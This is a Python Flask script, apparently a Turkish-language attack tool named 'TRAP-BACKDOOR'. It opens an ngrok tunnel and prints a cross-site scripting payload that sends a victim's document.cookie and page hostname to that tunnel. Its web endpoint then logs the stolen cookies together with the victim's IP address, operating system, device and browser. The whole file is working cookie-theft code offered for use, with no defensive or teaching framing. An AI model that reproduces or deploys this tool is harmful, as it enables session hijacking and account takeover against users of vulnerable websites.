from flask import Flask, request
from pyngrok import ngrok
from colorama import init, Fore
from datetime import datetime
import user_agents
import os
os.system("ngrok config add-authtoken (Your Ngrok Token)  || ./ngrok config add-authtoken (Your Ngrok Token) ")
init()
print(f"[{Fore.MAGENTA}TRAP-BACKDOOR{Fore.RESET}]")
app = Flask(__name__)

@app.route('/')
def home():


    all_params = request.args.items()
    user_agent_string = request.headers.get('User-Agent', 'Bilinmeyen Cihaz')
    ua = user_agents.parse(user_agent_string)
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    server_ip = request.host.split(':')[0]
    client_ip = request.remote_addr
    domain_name = request.host

    cookies = request.cookies
    host_cookie = cookies.get('host', 'Bilinmeyen Host')

    if ua.device.family == 'Other':
        device_type = 'Bilinmeyen Cihaz'
    elif ua.is_mobile:
        device_type = 'Mobil Cihaz'
    elif ua.is_tablet:
        device_type = 'Tablet'
    else:
        device_type = 'Bilgisayar'

    for param, value in all_params:
        if param == 'host':
            hostvalue = value
        else:
            CookiesText = f"{Fore.YELLOW}{param} = {value}{Fore.RESET}"

    print(f"{Fore.MAGENTA}Domain: {hostvalue}{Fore.RESET}")

    print(f"{Fore.CYAN}Ziyaret Bilgileri:{Fore.RESET}")
    print(f"{Fore.GREEN}Tarih: {current_time}{Fore.RESET}")
    print(f"{Fore.BLUE}İşletim Sistemi: {ua.os.family} {ua.os.version_string}{Fore.RESET}")
    print(f"{Fore.BLUE}Cihaz: {ua.device.family} ({device_type}){Fore.RESET}")
    print(f"{Fore.BLUE}Tarayıcı: {ua.browser.family} {ua.browser.version_string}{Fore.RESET}")
    print(f"{Fore.YELLOW}Çerezler: {CookiesText} {Fore.RESET}")

    js_payload = f'<script>var i=new Image;i.src="{ngrok_url}/?" + document.cookie + "&host=" + document.location.hostname;</script>'
    print("\n")
    return js_payload

def start_ngrok():
    public_url = ngrok.connect(5000)
    ngrok_url = public_url.public_url.replace("NgrokTunnel: ", "").split(" -> ")[0]
    return ngrok_url

if __name__ == '__main__':
    ngrok_url = start_ngrok()
    print(f"Ngrok URL: {ngrok_url}")
    print(f'Payload Backdoor-Url: <script>var i=new Image;i.src="{ngrok_url}/?" + document.cookie + "&host=" + document.location.hostname;</script>')

    app.run(port=5000)
